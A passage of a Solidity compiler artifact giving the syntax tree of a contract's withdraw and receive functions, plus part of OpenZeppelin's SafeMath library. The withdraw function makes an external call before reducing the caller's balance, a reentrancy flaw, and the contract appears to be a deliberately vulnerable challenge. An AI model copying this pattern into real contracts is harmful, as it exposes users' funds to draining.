																},
																"id": 130,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "functionCall",
																"lValueRequested": false,
																"names": [],
																"nodeType": "FunctionCall",
																"src": "554:34:1",
																"tryCall": false,
																"typeDescriptions": {
																	"typeIdentifier": "t_tuple$_t_bool_$_t_bytes_memory_ptr_$",
																	"typeString": "tuple(bool,bytes memory)"
																}
															},
															"nodeType": "VariableDeclarationStatement",
															"src": "537:51:1"
														},
														{
															"condition": {
																"argumentTypes": null,
																"id": 132,
																"name": "result",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 122,
																"src": "599:6:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																}
															},
															"falseBody": null,
															"id": 136,
															"nodeType": "IfStatement",
															"src": "596:37:1",
															"trueBody": {
																"id": 135,
																"nodeType": "Block",
																"src": "607:26:1",
																"statements": [
																	{
																		"expression": {
																			"argumentTypes": null,
																			"id": 133,
																			"name": "_amount",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 112,
																			"src": "617:7:1",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		"id": 134,
																		"nodeType": "ExpressionStatement",
																		"src": "617:7:1"
																	}
																]
															}
														},
														{
															"expression": {
																"argumentTypes": null,
																"id": 142,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"baseExpression": {
																		"argumentTypes": null,
																		"id": 137,
																		"name": "balances",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 80,
																		"src": "640:8:1",
																		"typeDescriptions": {
																			"typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
																			"typeString": "mapping(address => uint256)"
																		}
																	},
																	"id": 140,
																	"indexExpression": {
																		"argumentTypes": null,
																		"expression": {
																			"argumentTypes": null,
																			"id": 138,
																			"name": "msg",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 508,
																			"src": "649:3:1",
																			"typeDescriptions": {
																				"typeIdentifier": "t_magic_message",
																				"typeString": "msg"
																			}
																		},
																		"id": 139,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"memberName": "sender",
																		"nodeType": "MemberAccess",
																		"referencedDeclaration": null,
																		"src": "649:10:1",
																		"typeDescriptions": {
																			"typeIdentifier": "t_address_payable",
																			"typeString": "address payable"
																		}
																	},
																	"isConstant": false,
																	"isLValue": true,
																	"isPure": false,
																	"lValueRequested": true,
																	"nodeType": "IndexAccess",
																	"src": "640:20:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "Assignment",
																"operator": "-=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"id": 141,
																	"name": "_amount",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 112,
																	"src": "664:7:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"src": "640:31:1",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 143,
															"nodeType": "ExpressionStatement",
															"src": "640:31:1"
														}
													]
												}
											}
										]
									},
									"documentation": null,
									"functionSelector": "2e1a7d4d",
									"id": 147,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "withdraw",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 113,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 112,
												"name": "_amount",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 147,
												"src": "466:12:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 111,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "466:4:1",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "465:14:1"
									},
									"returnParameters": {
										"id": 114,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "487:0:1"
									},
									"scope": 152,
									"src": "448:234:1",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "public"
								},
								{
									"body": {
										"id": 150,
										"nodeType": "Block",
										"src": "713:2:1",
										"statements": []
									},
									"documentation": null,
									"id": 151,
									"implemented": true,
									"kind": "receive",
									"modifiers": [],
									"name": "",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 148,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "693:2:1"
									},
									"returnParameters": {
										"id": 149,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "713:0:1"
									},
									"scope": 152,
									"src": "686:29:1",
									"stateMutability": "payable",
									"virtual": false,
									"visibility": "external"
								}
							],
							"scope": 153,
							"src": "139:578:1"
						}
					],
					"src": "32:685:1"
				},
				"id": 1
			},
			"github/OpenZeppelin/openzeppelin-contracts/contracts/math/SafeMath.sol": {
				"ast": {
					"absolutePath": "github/OpenZeppelin/openzeppelin-contracts/contracts/math/SafeMath.sol",
					"exportedSymbols": {
						"SafeMath": [
							493
						]
					},
					"id": 494,
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 154,
							"literals": [
								"solidity",
								">=",
								"0.6",
								".0",
								"<",
								"0.8",
								".0"
							],
							"nodeType": "PragmaDirective",
							"src": "33:31:2"
						},
						{
							"abstract": false,
							"baseContracts": [],
							"contractDependencies": [],
							"contractKind": "library",
							"documentation": "@dev Wrappers over Solidity's arithmetic operations with added overflow\nchecks.\n * Arithmetic operations in Solidity wrap on overflow. This can easily result\nin bugs, because programmers usually assume that an overflow raises an\nerror, which is the standard behavior in high level programming languages.\n`SafeMath` restores this intuition by reverting the transaction when an\noperation overflows.\n * Using this library instead of the unchecked operations eliminates an entire\nclass of bugs, so it's recommended to use it always.",
							"fullyImplemented": true,
							"id": 493,
							"linearizedBaseContracts": [
								493
							],
							"name": "SafeMath",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"body": {
										"id": 183,
										"nodeType": "Block",
										"src": "865:98:2",
										"statements": [
											{
												"assignments": [
													166
												],
												"declarations": [
													{
														"constant": false,
														"id": 166,
														"name": "c",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 183,
														"src": "875:9:2",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 165,
															"name": "uint256",
															"nodeType": "ElementaryTypeName",
															"src": "875:7:2",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 170,
												"initialValue": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 169,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 167,
														"name": "a",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 156,
														"src": "887:1:2",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "+",
													"rightExpression": {
														"argumentTypes": null,
														"id": 168,
														"name": "b",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 158,
														"src": "891:1:2",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "887:5:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "875:17:2"
											},
											{
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 173,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 171,
														"name": "c",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 166,
														"src": "906:1:2",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "<",
													"rightExpression": {
														"argumentTypes": null,
														"id": 172,
														"name": "a",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 156,
														"src": "910:1:2",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "906:5:2",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": null,
												"id": 178,
												"nodeType": "IfStatement",
												"src": "902:28:2",
												"trueBody": {
													"expression": {
														"argumentTypes": null,
														"components": [
															{
																"argumentTypes": null,
																"hexValue": "66616c7365",
																"id": 174,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "bool",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "921:5:2",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																},
																"value": "false"
															},
															{
																"argumentTypes": null,
																"hexValue": "30",
																"id": 175,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "928:1:2",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_0_by_1",
																	"typeString": "int_const 0"
																},
																"value": "0"
															}
														],
														"id": 176,
														"isConstant": false,
														"isInlineArray": false,
														"isLValue": false,
														"isPure": true,
														"lValueRequested": false,
														"nodeType": "TupleExpression",
														"src": "920:10:2",
														"typeDescriptions": {
															"typeIdentifier": "t_tuple$_t_bool_$_t_rational_0_by_1_$",
															"typeString": "tuple(bool,int_const 0)"
														}
													},
													"functionReturnParameters": 164,
													"id": 177,
													"nodeType": "Return",
													"src": "913:17:2"
												}
											},
											{
												"expression": {
													"argumentTypes": null,
													"components": [
														{
															"argumentTypes": null,
															"hexValue": "74727565",
															"id": 179,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "bool",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "948:4:2",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															"value": "true"
														},
														{
															"argumentTypes": null,
															"id": 180,
															"name": "c",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 166,
															"src": "954:1:2",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"id": 181,
													"isConstant": false,
													"isInlineArray": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"nodeType": "TupleExpression",
													"src": "947:9:2",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$_t_bool_$_t_uint256_$",
														"typeString": "tuple(bool,uint256)"
													}
												},
												"functionReturnParameters": 164,
												"id": 182,
												"nodeType": "Return",
												"src": "940:16:2"
											}
										]
									},
									"documentation": "@dev Returns the addition of two unsigned integers, with an overflow flag.\n     * _Available since v3.4._",
									"id": 184,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "tryAdd",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 159,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 156,
												"name": "a",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 184,
												"src": "805:9:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 155,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "805:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 158,
												"name": "b",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 184,
												"src": "816:9:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 157,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "816:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "804:22:2"
									},
									"returnParameters": {
										"id": 164,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 161,
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 184,
												"src": "850:4:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bool",
													"typeString": "bool"
												},
												"typeName": {
													"id": 160,
													"name": "bool",
													"nodeType": "ElementaryTypeName",
													"src": "850:4:2",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 163,
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 184,
												"src": "856:7:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 162,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "856:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "849:15:2"
									},
									"scope": 493,
									"src": "789:174:2",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 209,
										"nodeType": "Block",
										"src": "1185:75:2",
										"statements": [
											{
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 197,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 195,
														"name": "b",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 188,
														"src": "1199:1:2",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": ">",
													"rightExpression": {
														"argumentTypes": null,
														"id": 196,
														"name": "a",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 186,
														"src": "1203:1:2",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "1199:5:2",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": null,
												"id": 202,
												"nodeType": "IfStatement",
												"src": "1195:28:2",
												"trueBody": {
													"expression": {
														"argumentTypes": null,
														"components": [
															{
																"argumentTypes": null,
																"hexValue": "66616c7365",
																"id": 198,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "bool",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "1214:5:2",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																},
																"value": "false"
															},
															{
																"argumentTypes": null,
																"hexValue": "30",
																"id": 199,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "1221:1:2",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_0_by_1",
																	"typeString": "int_const 0"
																},
																"value": "0"
															}
														],
														"id": 200,
														"isConstant": false,
														"isInlineArray": false,
														"isLValue": false,
														"isPure": true,
														"lValueRequested": false,
														"nodeType": "TupleExpression",
														"src": "1213:10:2",
														"typeDescriptions": {
															"typeIdentifier": "t_tuple$_t_bool_$_t_rational_0_by_1_$",
															"typeString": "tuple(bool,int_const 0)"
														}
													},
													"functionReturnParameters": 194,
													"id": 201,
													"nodeType": "Return",
													"src": "1206:17:2"
												}
											},
											{
												"expression": {
													"argumentTypes": null,
													"components": [
														{
															"argumentTypes": null,
															"hexValue": "74727565",
															"id": 203,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "bool",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "1241:4:2",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															"value": "true"
														},
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 206,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"id": 204,
																"name": "a",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 186,
																"src": "1247:1:2",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "-",
															"rightExpression": {
																"argumentTypes": null,
																"id": 205,
																"name": "b",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 188,
																"src": "1251:1:2",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"src": "1247:5:2",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"id": 207,
													"isConstant": false,
													"isInlineArray": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"nodeType": "TupleExpression",
													"src": "1240:13:2",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$_t_bool_$_t_uint256_$",
														"typeString": "tuple(bool,uint256)"
													}
												},
												"functionReturnParameters": 194,
												"id": 208,
												"nodeType": "Return",
												"src": "1233:20:2"
											}
										]
									},
									"documentation": "@dev Returns the substraction of two unsigned integers, with an overflow flag.\n     * _Available since v3.4._",
									"id": 210,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "trySub",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 189,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 186,
												"name": "a",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 210,
												"src": "1125:9:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 185,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "1125:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 188,
												"name": "b",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 210,
												"src": "1136:9:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 187,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "1136:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1124:22:2"
									},
									"returnParameters": {
										"id": 194,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 191,
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 210,
												"src": "1170:4:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bool",
													"typeString": "bool"
												},
												"typeName": {
													"id": 190,
													"name": "bool",
													"nodeType": "ElementaryTypeName",
													"src": "1170:4:2",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 193,
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 210,
												"src": "1176:7:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 192,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "1176:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1169:15:2"
									},
									"scope": 493,
									"src": "1109:151:2",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 249,
										"nodeType": "Block",
										"src": "1484:359:2",
										"statements": [
											{
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 223,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 221,
														"name": "a",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 212,
														"src": "1716:1:2",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "==",
													"rightExpression": {
														"argumentTypes": null,
														"hexValue": "30",
														"id": 222,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "1721:1:2",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_0_by_1",
															"typeString": "int_const 0"
														},
														"value": "0"
													},
													"src": "1716:6:2",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": null,
												"id": 228,
												"nodeType": "IfStatement",
												"src": "1712:28:2",
												"trueBody": {
													"expression": {
														"argumentTypes": null,
														"components": [
															{
																"argumentTypes": null,
																"hexValue": "74727565",
																"id": 224,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "bool",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "1732:4:2",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																},
																"value": "true"
															},
															{
																"argumentTypes": null,
																"hexValue": "30",
																"id": 225,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "1738:1:2",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_0_by_1",
																	"typeString": "int_const 0"
																},
																"value": "0"
															}
														],
														"id": 226,
														"isConstant": false,
														"isInlineArray": false,
														"isLValue": false,
														"isPure": true,
														"lValueRequested": false,
														"nodeType": "TupleExpression",
														"src": "1731:9:2",
														"typeDescriptions": {
															"typeIdentifier": "t_tuple$_t_bool_$_t_rational_0_by_1_$",
															"typeString": "tuple(bool,int_const 0)"
														}
													},
													"functionReturnParameters": 220,
													"id": 227,
													"nodeType": "Return",
													"src": "1724:16:2"
												}
											},
											{
												"assignments": [
													230
												],
												"declarations": [
													{
														"constant": false,
														"id": 230,
														"name": "c",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 249,
														"src": "1750:9:2",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 229,
															"name": "uint256",
															"nodeType": "ElementaryTypeName",
															"src": "1750:7:2",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 234,
												"initialValue": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 233,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 231,
														"name": "a",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 212,
														"src": "1762:1:2",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "*",
													"rightExpression": {
														"argumentTypes": null,
														"id": 232,
														"name": "b",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 214,
														"src": "1766:1:2",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "1762:5:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "1750:17:2"
											},
											{
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 239,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"commonType": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"id": 237,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"leftExpression": {
															"argumentTypes": null,
															"id": 235,
															"name": "c",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 230,
															"src": "1781:1:2",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"nodeType": "BinaryOperation",
														"operator": "/",
														"rightExpression": {
															"argumentTypes": null,
															"id": 236,
															"name": "a",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 212,
															"src": "1785:1:2",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"src": "1781:5:2",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "!=",
													"rightExpression": {
														"argumentTypes": null,
														"id": 238,
														"name": "b",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 214,
														"src": "1790:1:2",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "1781:10:2",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": null,
												"id": 244,
												"nodeType": "IfStatement",
												"src": "1777:33:2",
												"trueBody": {
													"expression": {
														"argumentTypes": null,
														"components": [
															{
																"argumentTypes": null,
																"hexValue": "66616c7365",
																"id": 240,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "bool",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "1801:5:2",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																},
																"value": "false"
															},
															{
																"argumentTypes": null,
																"hexValue": "30",
																"id": 241,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "1808:1:2",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_0_by_1",
																	"typeString": "int_const 0"
																},
																"value": "0"
															}
														],
														"id": 242,
														"isConstant": false,
														"isInlineArray": false,
														"isLValue": false,
														"isPure": true,
														"lValueRequested": false,
														"nodeType": "TupleExpression",
														"src": "1800:10:2",
														"typeDescriptions": {
															"typeIdentifier": "t_tuple$_t_bool_$_t_rational_0_by_1_$",
															"typeString": "tuple(bool,int_const 0)"
														}
													},
													"functionReturnParameters": 220,
													"id": 243,
													"nodeType": "Return",
													"src": "1793:17:2"
												}
											},
											{
												"expression": {
													"argumentTypes": null,
													"components": [
														{
															"argumentTypes": null,
															"hexValue": "74727565",
															"id": 245,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "bool",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "1828:4:2",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															"value": "true"
														},
														{
															"argumentTypes": null,
															"id": 246,
															"name": "c",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 230,
															"src": "1834:1:2",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"id": 247,
													"isConstant": false,
													"isInlineArray": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"nodeType": "TupleExpression",
													"src": "1827:9:2",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$_t_bool_$_t_uint256_$",
														"typeString": "tuple(bool,uint256)"
													}
												},
												"functionReturnParameters": 220,
												"id": 248,
												"nodeType": "Return",
												"src": "1820:16:2"
											}
										]
									},
									"documentation": "@dev Returns the multiplication of two unsigned integers, with an overflow flag.\n     * _Available since v3.4._",
									"id": 250,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "tryMul",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 215,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 212,
												"name": "a",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 250,
